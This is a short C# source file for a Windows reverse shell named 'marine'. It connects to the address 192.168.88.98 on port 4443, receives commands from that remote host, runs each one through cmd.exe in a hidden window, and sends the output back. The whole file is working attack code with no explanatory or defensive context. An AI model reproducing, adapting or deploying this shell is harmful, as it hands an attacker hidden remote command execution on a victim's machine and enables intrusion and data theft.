using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

class marine
{
    static void Main()
    {
        string ipAddress = "192.168.88.98";
        int port = 4443;

        TcpClient client = new TcpClient(ipAddress, port);
		
        NetworkStream stream = client.GetStream();
        StreamReader reader = new StreamReader(stream);
        StreamWriter writer = new StreamWriter(stream);
			
        while (true)
        {
            try
            {
                string command = reader.ReadLine();

                if (command.Trim().ToLower() == "exit")
                {
                    writer.WriteLine("Exiting...");
                    writer.Flush();
                    break;
                }

                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();

				writer.Write("marine#" + output);
                writer.Flush();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                break;
            }
        }

        client.Close();
    }
}